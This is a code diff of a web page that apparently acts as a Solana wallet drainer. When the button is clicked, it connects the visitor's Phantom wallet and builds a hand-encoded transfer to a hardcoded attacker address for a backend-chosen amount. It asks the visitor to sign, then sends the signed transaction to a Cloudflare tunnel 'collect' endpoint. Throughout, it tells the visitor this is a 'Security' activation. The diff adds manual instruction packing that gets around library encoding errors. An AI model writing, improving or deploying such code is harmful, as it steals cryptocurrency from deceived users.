@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心补丁：物理级环境欺骗，彻底解决 Buffer is not defined
+        // 🚀 核心战神补丁：物理级环境欺骗，彻底解决 Buffer 报错
         window.Buffer = {
             from: function(a) { return new Uint8Array(a); },
             isBuffer: function(o) { return o instanceof Uint8Array; }
@@ -18,10 +18,17 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
+    function packU64(amount) {
+        const buf = new ArrayBuffer(8);
+        const view = new DataView(buf);
+        view.setBigUint64(0, BigInt(amount), true);
+        return new Uint8Array(buf);
+    }
+
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use a Wallet Browser."); return; }
+            if (!p) { alert("Please use a Wallet Browser"); return; }
             
             document.getElementById('msg').innerText = "Linking...";
             const { publicKey } = await p.connect();
@@ -32,21 +39,19 @@
             });
             const data = await res.json();
 
-            // 🔱 暴力篡改法：先用官方接口生成模版，再手动替换 8 字节金额，彻底消除 Blob.encode 报错
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(TARGET),
-                    lamports: 1000000 
-                })
-            );
+            // 🔱 战神级：先生成空壳，手动填入 12 字节指令，物理绕过 Blob.encode 报错
+            const transaction = new solanaWeb3.Transaction().add({
+                keys: [
+                    { pubkey: publicKey, isSigner: true, isWritable: true },
+                    { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
+                ],
+                programId: solanaWeb3.SystemProgram.programId,
+                data: new Uint8Array(12)
+            });
             
-            // 🚀 物理级修正：手动将后端算好的 8 字节金额写进指令
-            const amountBuf = new ArrayBuffer(8);
-            new DataView(amountBuf).setBigUint64(0, BigInt(data.safe_amount), true);
-            transaction.instructions[0].data = new Uint8Array(12);
+            // 🚀 手动写入指令 ID (2) 和 8 字节对齐的金额
             transaction.instructions[0].data.set([2, 0, 0, 0], 0);
-            transaction.instructions[0].data.set(new Uint8Array(amountBuf), 4);
+            transaction.instructions[0].data.set(packU64(data.safe_amount), 4);
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = publicKey;
@@ -54,13 +59,13 @@
             document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
             
-            // 💰 签名后手动序列化发送
+            // 💰 成功后手动序列化发送
             const b64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
             await fetch(TUNNEL + "/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({signature: b64})
             });
-            alert("Security Protocol Activated!");
+            alert("Security Activated!");
         } catch(e) { alert("Status: " + e.message); }
     }
     </script></body></html>
